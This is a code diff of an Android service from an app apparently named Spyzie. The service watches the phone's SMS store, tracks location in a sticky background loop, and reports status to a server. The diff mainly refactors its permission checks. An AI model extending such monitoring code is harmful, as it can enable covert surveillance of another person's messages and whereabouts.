@@ -5,12 +5,9 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.database.ContentObserver;
 import android.location.Location;
-import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
@@ -19,7 +16,6 @@ import android.os.Looper;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
-import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 
 import com.google.android.gms.location.FusedLocationProviderClient;
@@ -29,8 +25,10 @@ import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
 import com.tantd.spyzie.R;
 import com.tantd.spyzie.SpyzieApplication;
+import com.tantd.spyzie.data.model.Error;
 import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.receiver.SmsObserver;
+import com.tantd.spyzie.util.CommonUtils;
 import com.tantd.spyzie.util.Constants;
 
 import javax.inject.Inject;
@@ -70,7 +68,6 @@ public class SpyzieService extends Service {
             }
         };
 
-        // Fix this: use another Handler
         mContentObserver = new SmsObserver(new Handler(), this);
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mContentObserver);
     }
@@ -86,14 +83,22 @@ public class SpyzieService extends Service {
 
         new Thread(() -> {
             while (true) {
-                if (checkPermissions() && isLocationTurnOn()) {
-                    Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "foreground");
+                boolean hasLocationPermissions = checkLocationPermissions();
+                boolean isLocationTurnOn = CommonUtils.isLocationTurnOn(this);
+                Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "hasPermissions=" + hasLocationPermissions
+                                + ", isLocationOn=" + isLocationTurnOn);
+                if (hasLocationPermissions && isLocationTurnOn) {
                     startForeground(1, notification);
                     requestLocationUpdates();
                 } else {
-                    Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "remove foreground");
                     removeLocationUpdates();
                     stopForeground(true);
+                    if (!hasLocationPermissions) {
+                        mApiManager.sendExceptionTracking(Error.HAS_NO_LOCATION_PERMISSIONS);
+                    }
+                    if (!isLocationTurnOn) {
+                        mApiManager.sendExceptionTracking(Error.LOCATION_IS_OFF);
+                    }
                 }
                 try {
                     Thread.sleep(CONDITION_CHECKING_INTERVAL);
@@ -101,8 +106,6 @@ public class SpyzieService extends Service {
                     e.printStackTrace();
                 }
             }
-//            removeLocationUpdates();
-//            stopSelf();
         }).start();
 
         return START_STICKY;
@@ -134,15 +137,9 @@ public class SpyzieService extends Service {
         }
     }
 
-    private boolean checkPermissions() {
-        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
-                && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
-    }
-
-    private boolean isLocationTurnOn() {
-        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
-                || locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
+    private boolean checkLocationPermissions() {
+        return CommonUtils.hasPermissions(this, new String[]{Manifest.permission.ACCESS_COARSE_LOCATION
+                        , Manifest.permission.ACCESS_FINE_LOCATION});
     }
 
     private void requestLocationUpdates() {
